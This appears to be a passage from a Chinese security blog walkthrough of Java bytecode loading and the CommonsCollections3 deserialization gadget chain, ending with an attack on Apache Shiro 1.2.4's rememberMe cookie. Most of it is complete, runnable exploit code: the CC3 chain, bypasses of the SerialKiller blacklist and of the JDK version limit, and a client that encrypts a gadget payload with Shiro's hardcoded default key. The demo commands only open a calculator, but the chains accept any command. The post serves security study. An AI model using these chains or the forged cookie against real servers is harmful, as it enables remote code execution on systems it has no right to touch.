        byte[] code = Base64.decodeBase64("yv66vgAAADQAHAoABgAOCQAPABAIABEKABIAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhDAAHAAgHABYMABcAGAEAC0hlbGxvIFdvcmxkBwAZDAAaABsBAAVIZWxsbwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAYAAAAAAAIAAQAHAAgAAQAJAAAAHQABAAEAAAAFKrcAAbEAAAABAAoAAAAGAAEAAAACAAgACwAIAAEACQAAACUAAgAAAAAACbIAAhIDtgAEsQAAAAEACgAAAAoAAgAAAAQACAAFAAEADAAAAAIADQ==");  
        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), "Hello", code, 0, code.length);  
        hello.newInstance();  
    }  
}
```
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240304142746425.png)
执行输出了Hello World
因为系统的`ClassLoader#defineClass`是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用。
在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链`TemplatesImpl`的基石。

3、利用TemplatesImpl加载字节码
虽然大部分上层开发者不会直接使用到defineClass方法，但是Java底层还是有一些类用到了它。
`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`这个类中定义了一个内部类`TransletClassLoader`:
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240304153539741.png)
这个类里重写了`defineClass`方法，并且这里没有显式地声明其定义域。
Java中默认情况下，如果一个 方法没有显式声明作用域，其作用域为default。
所以也就是说这里的`defineClass`由其父类的protected类型变成了一个default类型的方法，类之外可以被外部调用。

从`TransletClassLoader#defineClass()`向前追溯一下调用链：

```java
TemplatesImpl#getOutputProperties()
-->
TemplatesImpl#newTransformer()
-->
TemplatesImpl#getTransletInstance()
-->
TemplatesImpl#defineTransletClasses()
-->
TransletClassLoader#defineClass()
```
跟进最前面的两个方法`TemplatesImpl#getOutputProperties()`和`TemplatesImpl#newTransformer()`，两者的作用域都是public，可以被外部调用。
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240304154757837.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240304154816082.png)
尝试使用`newTransformer()`构造一个简单的Poc:
```java
public static void main(String[] args) throws Exception {
        // source: bytecodes/HelloTemplateImpl.java
        byte[] code = Base64.decodeBase64("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        obj.newTransformer();
    }
```

`SetFieldValue`方法用来设置私有属性，设置了三个属性：
`_bytecodes`是由字节码组成的数组；
`_name`可以为任意字符串，不为null即可；
`_tfactory`需要是一个`TransformerFactoryImpl`对象（因为`TransletClassLoader#defineClass()`方法里有调用到`_tfactory.getExternalExtensionsMap()`，若为null则会报错）
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240304155812336.png)

另外需注意的一点是，`TemplatesImpl`中对加载的字节码是有要求的:这个字节码对应的类必须是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`的子类。

所以需构造一个特殊的类：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240304161848904.png)
它继承了`AbstractTranslet`类，并在构造函数里插入Hello的输出。
将其编译成字节码，即可被`TemplatesImpl`执行了:
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240304163227215.png)
Fastjson和Jackson的漏洞中也会接触到`TemplatesImpl`。

4、利用BCEL ClassLoader加载字节码
刚才说到所有能够恢复成一个类并在JVM虚拟机里加载的字节序列都在探讨范围内，所以bcel字节码也必然在我们的讨论范围内。

BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中。
（详细介绍：https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html）

BCEL提供两个类`Repository`和`Utility`，可利用：
`Repository`将一个Java Class先转换成原生字节码（也可以直接用javac命令编译java文件来生成）。
`Utility`用于将原生字节码转换成BCEL格式的字节码。
```java
package com.govuln;

import com.sun.org.apache.bcel.internal.classfile.JavaClass; 
import com.sun.org.apache.bcel.internal.classfile.Utility; 
import com.sun.org.apache.bcel.internal.Repository;

public class HelloBCEL {

	public static void main(String []args) throws Exception {
		JavaClass cls = Repository.lookupClass(evil.Hello.class); 
		String code = Utility.encode(cls.getBytes(), true);
		System.out.println(code); 
	}

}
```
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240304164315272.png)

而BCEL ClassLoader则用于加载这串BCEL格式的字节码，并可以执行其中的代码：
```java
package com.govuln.bytes;  
  
import com.sun.org.apache.bcel.internal.classfile.JavaClass;  
import com.sun.org.apache.bcel.internal.classfile.Utility;  
import com.sun.org.apache.bcel.internal.Repository;  
import com.sun.org.apache.bcel.internal.util.ClassLoader;  
  
public class HelloBCELTest {  
    public static void main(String []args) throws Exception {  
        //encode();  
        decode();  
    }  
  
    public static void encode() throws Exception {  
        JavaClass cls = Repository.lookupClass(evil.Hello.class);  
        String code = Utility.encode(cls.getBytes(), true);  
        System.out.println(code);  
    }  
  
    protected static void decode() throws Exception {  
         new ClassLoader().loadClass("$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmP$cbN$CA$Q$ac$91$c7$$$cb$w$I$e2$fby0$B$P$ee$c5$h$c4$8b$89$f1$b0Q$T$M$9e$87e$82C$86$j$b3$M$q$7e$96$k4$f1$e0$H$f8Q$c6$9e$91$f8H$ecCW$ba$aa$ba$d23$ef$l$afo$AN$b0$X$a0$88$e5$Sj$a8$fbX$J$d0$c0$aa$875$P$eb$M$c5$8eL$a59e$c85$5b$3d$86$fc$99$k$I$86J$ySq9$j$f7Ev$c3$fb$8a$98Z$ac$T$aez$3c$93v$9e$93ys$t$t$Ma$yfRE$XB$v$ddf$f0$3b$89$9a$87$G$5d$3d$cd$Sq$$$ad$3bp$86$e3$R$9f$f1$Q$k$7c$P$h$n6$b1$c5Pv$ca$fe$ad$ce$d4$c0$c3v$88$j$ec$92$ff$t$95$a1j$d7$o$c5$d3at$d5$l$89$c4$fc$a1$ba$P$T$p$c6$f4$I$3d$r$a1$R$3bE$ea$e8$3a$93$a9$e9$9aL$f01$jV$ff$87f$f0$ee$ed$a4R$dak$c6$bf$o$N$d1$c3v$ab$87$D$U$e8$fbl$z$80$d9$c3$a9$97h$8a$I$Za$e1$e8$F$ec$d1$c9$B$f5$a2$ps$uS$P$bf$M$84$8b$84$3e$96$be$97$P$c9m$ab$f4$84$85Z$ee$Zy$h$c0$5c$40$e0$a4$CYmT$c5$FW$3f$B$dc$ab$c0$7f$cc$B$A$A").newInstance();  
    }  
}
```
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240304165235217.png)
在Java 8u251的更新中，这个ClassLoader被移除了。

### 构造Poc
将`TemplatesImpl`执行字节码的方法 和 cc1时使用`TransformedMap`执行任意方法的简化Poc进行结合：
cc1时使用`TransformedMap`执行任意方法的简化Poc:
```java
package com.govuln.deserialization;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.util.HashMap;  
import java.util.Map;  
  
public class CommonsCollectionsIntro {  
    public static void main(String[] args) throws Exception {  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.getRuntime()),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"}),  
        };  
  
        Transformer transformerChain = new ChainedTransformer(transformers);  
  
        Map innerMap = new HashMap();  
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);  
        outerMap.put("test", "xxxx");  
    }  
}
```
`TemplatesImpl`执⾏字节码:
```java
// source: bytecodes/HelloTemplateImpl.java  
byte[] code = Base64.decodeBase64("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");  
TemplatesImpl obj = new TemplatesImpl();  
setFieldValue(obj, "_bytecodes", new byte[][] {code});  
setFieldValue(obj, "_name", "HelloTemplatesImpl");  
setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());  
  
obj.newTransformer();
```
只需将第一个demo中的`InvokerTransformer`执行的“方法”改成`TemplatesImpl::newTransformer()`，即:
```java
Transformer[] transformers = new Transformer[]{  
        new ConstantTransformer(obj),  
        new InvokerTransformer("newTransformer", null, null),  
};
```
完整Poc:
```java
package com.govuln.deserialization;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.util.HashMap;  
import java.util.Map;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.codec.binary.Base64;  
  
import java.lang.reflect.Field;  
  
public class CommonsCollections3Test {  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {  
        Field field = obj.getClass().getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
  
    public static void main(String[] args) throws Exception {  
        // source: bytecodes/HelloTemplateImpl.java  
        byte[] code = Base64.decodeBase64("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");  
        TemplatesImpl obj = new TemplatesImpl();  
        setFieldValue(obj, "_bytecodes", new byte[][] {code});  
        setFieldValue(obj, "_name", "HelloTemplatesImpl");  
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(obj),  
                new InvokerTransformer("newTransformer", null, null),  
        };  
  
        Transformer transformerChain = new ChainedTransformer(transformers);  
  
        Map innerMap = new HashMap();  
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);  
        outerMap.put("test", "xxxx");  
  
  
    }  
}
```
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240305102659010.png)
执行成功
### 绕过过滤
而在ysoserial内的CommonsCollections3却没有用到`InvokerTransformer`：
因为SerialKiller是一个Java反序列化过滤器，可以通过黑名单、白名单的方式限制反序列化时允许通过的类，在其第一个版本的代码中就将`InvokerTransformer`放入了黑名单。
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240305105345902.png)

随后ysoserial增加了新的Gadget，比如CommonsCollections3就是为了绕过一些规则对`InvokerTransformer`的限制。
CommonsCollections3没有使用`InvokerTransformer`来调用任意方法，而是使用了`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`这个类。在其构造方法中调用了`(TransformerImpl) templates.newTransformer()`，免去了使用`InvokerTransformer`调用`newTransformer()`方法:
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240305105656139.png)
缺少`InvokerTransformer`，`TrAXFilter`的构造方法也是无法调用的。需使用一个新的`Transformer`,为`org.apache.commons.collections.functors.InstantiateTransformer`。`InstantiateTransformer`也是一个实现了Transformer接口的类，其作用就是调用构造方法。
利⽤`InstantiateTransformer`来调⽤到`TrAXFilter`的构造⽅法，再利⽤其构造⽅法⾥的`templates.newTransformer()`调⽤到`TemplatesImpl`⾥的字节码。
```
org.apache.commons.collections.functors.InstantiateTransformer
-->
com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter
-->
templates.newTransformer()
-->
TemplatesImpl
```

```java
Transformer[] transformers = new Transformer[]{
	new ConstantTransformer(TrAXFilter.class),
	new InstantiateTransformer(
		new Class[] {Template.class},
		new Object[] {obj})
};
```

替换到前面的demo中，也能在避免使用InvokerTransformer成功触发:
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240305113644315.png)
完整的Poc:
```java
package com.govuln.deserialization;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import javassist.ClassPool;  
import javassist.CtClass;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import javax.xml.transform.Templates;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.annotation.Retention;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationHandler;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CommonsCollections3 {  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {  
        Field field = obj.getClass().getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl obj = new TemplatesImpl();  
        setFieldValue(obj, "_bytecodes", new byte[][]{  
                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()  
        });  
        setFieldValue(obj, "_name", "HelloTemplatesImpl");  
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());  
  
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class),  
                new InstantiateTransformer(  
                        new Class[] { Templates.class },  
                        new Object[] { obj })  
        };  
  
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);  
  
        Map innerMap = new HashMap();  
        innerMap.put("value", "xxxx");  
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);  
  
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);  
        construct.setAccessible(true);  
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);  
  
        setFieldValue(transformerChain, "iTransformers", transformers);  
        // ==================  
        // 生成序列化字符串  
        ByteArrayOutputStream barr = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(barr);  
        oos.writeObject(handler);  
        oos.close();  
  
        // 本地测试触发  
        // System.out.println(barr);  
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));  
        Object o = (Object) ois.readObject();  
    }  
}
```
这个Poc与CC1一样，只支持8u71及以下的版本：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240305114305071.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240305114310240.png)
### 绕过版本限制
可结合在CC6时用到的方法，来绕过版本的限制：
梳理一下使用上半部分这条链绕过JDK版本限制
```
/*
Gadget chain:

java.io.ObjectInputStream.readObject() 
	java.util.HashMap.readObject() 
		java.util.HashMap.hash()
org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() 
						org.apache.commons.collections.map.LazyMap.get()



org.apache.commons.collections.functors.ChainedTransformer.transform()
org.apache.commons.collections.functors.InstantiateTransformer.transform()
					com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter
												templates.newTransformer()
															TemplatesImpl
*/
```

构造恶意的LazyMap的对象
```java
// 1、构造恶意LazyMap  
Map innerMap = new HashMap();  
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```
构造恶意TiedMapEntry
```java
// 2、构造恶意TiedMapEntry  
//将上面构造的恶意LazyMap对象outerMap作为参数传入TiedMapEntry构造函数,作为其map的属性  
TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");  
//新建一个HashMap对象，将上面构造的恶意TiedMapEntry对象tme作为其key，"valuevalue"作为其value  
Map expMap = new HashMap();  
expMap.put(tme, "valuevalue");  
  
outerMap.remove("keykey");
```
将expMap作为对象序列化
```java
//3、将expMap作为对象序列化  
//将真正的transformers替换进来  
Field f = ChainedTransformer.class.getDeclaredField("iTransformers");  
f.setAccessible(true);  
f.set(transformerChain, transformers);
```

完整Poc:
```java
package com.govuln.deserialization;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
//import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
//import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
//import java.lang.annotation.Retention;
//import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
//import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3TestJdk {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
        });
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { obj })
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        // 1、构造恶意LazyMap
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        //innerMap.put("value", "xxxx");
        //Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        // 2、构造恶意TiedMapEntry
        //将上面构造的恶意LazyMap对象outerMap作为参数传入TiedMapEntry构造函数,作为其map的属性
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        //新建一个HashMap对象，将上面构造的恶意TiedMapEntry对象tme作为其key，"valuevalue"作为其value
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        outerMap.remove("keykey");

//        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
//        construct.setAccessible(true);
//        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
//
//        setFieldValue(transformerChain, "iTransformers", transformers);
        //3、将expMap作为对象序列化
        //将真正的transformers替换进来
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);
        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        // 本地测试触发
        // System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240305143925129.png)
成功绕过JDK版本限制

## TemplatesImpl在Shiro中的利用
### 使用CommonsCollection6攻击Shiro
Shiro反序列化漏洞原理:**为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。但是在Shiro1.2.4版本之前内置了一个默认且固定的加密Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。**

通过tomcat部署shiro：
shiro 1.2.4
依赖：
shiro-core、shiro-web
将项目通过`mvn package`打包放入Tomcat的Web目录下
https://github.com/phith0n/JavaThings/tree/master/shirodemo
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306110646563.png)
输入账号密码root/secret成功登录
勾选Remember me选项后，登录成功则会返回一个rememberMe的Cookie:
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306111031964.png)
攻击过程：
1、通过CC链生成一个反序列化Payload
2、使用Shiro默认Key进行加密
3、将密文作为rememberMe的Cookie发送给服务端

实现1、2步，使用CC6的Gadget编写了Client0.java
```java
package com.govuln.shiroattack;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class Client0 {
    public static void main(String []args) throws Exception {
        byte[] payloads = new CommonsCollections6().getPayload("open -a Calculator.app");
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```

加密过程之间使用shiro的内置类`org.apache.shiro.crypto.AesCipherService`，最后生成一段base64字符串
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306112310751.png)
将其作为rememberMe的值（不做URL编码），发送给shiro。并未弹出计算器，而tomcat报错
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306112847849.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306112854808.png)
来看异常的最后一行的这个类`org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass`
是ObjectInputStream的子类，并且重写了`resolveClass`方法
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306113158337.png)
而原本`ObjectInputStream`类中的`resolveClass`是反序列化中用来查找类的方法，即读取序列化流的时候，独到一个字符串形式的类名，需要通过这个方法来找到对于的`java.lang.Class`对象
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306113658364.png)
再对比一下
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306113852928.png)
